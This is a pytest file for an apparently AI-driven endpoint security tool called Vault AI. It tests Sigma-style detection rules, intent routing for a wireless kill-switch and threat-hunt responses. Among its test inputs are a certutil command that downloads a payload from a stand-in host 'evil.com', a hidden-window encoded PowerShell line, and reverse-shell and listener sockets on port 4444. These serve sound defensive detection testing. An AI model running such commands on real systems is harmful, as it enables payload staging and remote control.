"""Unit tests for Vault AI's Attack Detection and Emergency Containment System."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from core.ai.graph import security_node
from core.ai.router import Intent, classify_intent
from core.security.killswitch import get_wireless_status
from core.security.sentinel import TelemetrySentinel, hunt_system_threats
from core.security.sigma_engine import SigmaEngine, ThreatSeverity


class TestSigmaEngine:
    """Test behavioral detection rules in SigmaEngine."""

    def setup_method(self):
        self.engine = SigmaEngine()

    def test_suspicious_parent_child_detection(self):
        """Office app spawning a command shell should trigger SIGMA-001."""
        alerts = self.engine.evaluate_process(
            image_name="powershell.exe",
            cmdline="powershell.exe -nop",
            parent_name="winword.exe",
            pid=1234,
        )
        assert len(alerts) >= 1
        rule_ids = [a.rule_id for a in alerts]
        assert "SIGMA-001" in rule_ids
        alert = next(a for a in alerts if a.rule_id == "SIGMA-001")
        assert alert.severity == ThreatSeverity.CRITICAL
        assert "T1204.002" in alert.mitre_attack
        assert alert.recommended_action == "ISOLATE_WIRELESS"

    def test_encoded_powershell_detection(self):
        """PowerShell with encoded commands or hidden window should trigger SIGMA-002."""
        alerts = self.engine.evaluate_process(
            image_name="powershell.exe",
            cmdline="powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
            parent_name="cmd.exe",
            pid=2345,
        )
        rule_ids = [a.rule_id for a in alerts]
        assert "SIGMA-002" in rule_ids
        alert = next(a for a in alerts if a.rule_id == "SIGMA-002")
        assert alert.severity == ThreatSeverity.HIGH
        assert "T1059.001" in alert.mitre_attack

    def test_lolbin_download_staging(self):
        """Certutil downloading a remote payload should trigger SIGMA-003."""
        alerts = self.engine.evaluate_process(
            image_name="certutil.exe",
            cmdline="certutil.exe -urlcache -f http://evil.com/payload.exe payload.exe",
            parent_name="explorer.exe",
            pid=3456,
        )
        rule_ids = [a.rule_id for a in alerts]
        assert "SIGMA-003" in rule_ids
        alert = next(a for a in alerts if a.rule_id == "SIGMA-003")
        assert alert.severity == ThreatSeverity.HIGH

    def test_reverse_shell_c2_socket(self):
        """Shell opening outbound connection to port 4444 should trigger SIGMA-004."""
        alerts = self.engine.evaluate_connection(
            image_name="powershell.exe",
            pid=4567,
            remote_ip="198.51.100.23",
            remote_port=4444,
            status="ESTABLISHED",
        )
        rule_ids = [a.rule_id for a in alerts]
        assert "SIGMA-004" in rule_ids
        alert = next(a for a in alerts if a.rule_id == "SIGMA-004")
        assert alert.severity == ThreatSeverity.CRITICAL
        assert alert.recommended_action == "ISOLATE_WIRELESS"

    def test_listening_backdoor_socket(self):
        """PowerShell listening on port 4444 should trigger SIGMA-004 listener alert."""
        alerts = self.engine.evaluate_connection(
            image_name="powershell.exe",
            pid=4568,
            remote_ip="",
            remote_port=0,
            status="LISTEN",
            local_port=4444,
        )
        assert len(alerts) >= 1
        rule_ids = [a.rule_id for a in alerts]
        assert "SIGMA-004" in rule_ids
        alert = alerts[0]
        assert alert.severity == ThreatSeverity.CRITICAL
        assert alert.recommended_action == "ISOLATE_WIRELESS"

    def test_benign_developer_process_no_false_positive(self):
        """Normal developer activity should not trigger Sigma rules."""
        alerts = self.engine.evaluate_process(
            image_name="python.exe",
            cmdline="python.exe manage.py runserver",
            parent_name="code.exe",
            pid=5678,
        )
        assert len(alerts) == 0

    def test_loopback_socket_ignored(self):
        """Localhost traffic must be ignored."""
        alerts = self.engine.evaluate_connection(
            image_name="powershell.exe",
            pid=4567,
            remote_ip="127.0.0.1",
            remote_port=4444,
        )
        assert len(alerts) == 0


class TestTelemetrySentinel:
    """Test live sensor gathering telemetry and incident snapshots."""

    def test_sentinel_snapshot_structure(self):
        sentinel = TelemetrySentinel()
        snapshot = sentinel.hunt_threats()
        assert "timestamp" in snapshot
        assert "has_active_threat" in snapshot
        assert "alerts" in snapshot
        assert "system_metrics" in snapshot
        assert isinstance(snapshot["total_alerts"], int)


class TestRouterSecurityPatterns:
    """Verify emergency killswitch and threat hunting intent routing."""

    def test_killswitch_queries(self):
        queries = [
            "disconnect all wireless",
            "kill wireless",
            "stop all wireless connections",
            "air gap my laptop",
            "emergency stop wireless",
        ]
        for q in queries:
            assert classify_intent(q) == Intent.SECURITY_CHECK, f"Failed for {q}"

    def test_restore_queries(self):
        queries = [
            "restore wireless",
            "reconnect wifi",
            "re-enable wifi",
            "restore wifi",
        ]
        for q in queries:
            assert classify_intent(q) == Intent.SECURITY_CHECK, f"Failed for {q}"

    def test_threat_hunt_queries(self):
        queries = [
            "threat hunt",
            "detect attacks",
            "check intrusion",
            "is an attacker attacking",
        ]
        for q in queries:
            assert classify_intent(q) == Intent.SECURITY_CHECK, f"Failed for {q}"

    def test_security_audit_queries(self):
        queries = [
            "security check",
            "security audit",
            "check security",
            "laptop security",
            "secure boot",
            "check secure boot status",
        ]
        for q in queries:
            assert classify_intent(q) == Intent.SECURITY_CHECK, f"Failed for {q}"


class TestSecurityNodeContainment:
    """Verify security_node dispatches killswitch, restore, and hunt correctly."""

    @patch("core.security.analyst.disconnect_all_wireless")
    def test_security_node_emergency_airgap(self, mock_disconnect):
        mock_disconnect.return_value = {
            "success": True,
            "firewall_blocked": True,
            "disabled_adapters": ["Wi-Fi"],
            "disabled_bluetooth": ["Intel Wireless Bluetooth"],
            "errors": [],
        }

        state = {
            "user_query": "disconnect all wireless",
            "intent": Intent.SECURITY_CHECK.value,
        }
        res = security_node(state)
        response = res["response"]
        assert response["status"] == "success"
        assert "Emergency Wireless Kill-Switch Activated" in response["content"]
        assert "Air-Gap Containment Enforced" in response["content"]

    @patch("core.security.analyst.restore_wireless")
    def test_security_node_restore(self, mock_restore):
        mock_restore.return_value = {
            "success": True,
            "firewall_restored": True,
            "enabled_adapters": ["Wi-Fi"],
            "enabled_bluetooth": ["Intel Wireless Bluetooth"],
            "errors": [],
        }

        state = {
            "user_query": "restore wireless",
            "intent": Intent.SECURITY_CHECK.value,
        }
        res = security_node(state)
        response = res["response"]
        assert response["status"] == "success"
        assert "Wireless Connectivity Successfully Restored" in response["content"]

    def test_security_node_threat_hunt(self):
        state = {
            "user_query": "hunt threats and detect attacks",
            "intent": Intent.SECURITY_CHECK.value,
        }
        res = security_node(state)
        response = res["response"]
        assert response["status"] == "success"
        assert "Diagnostic" in response["content"] or "SOC" in response["content"]
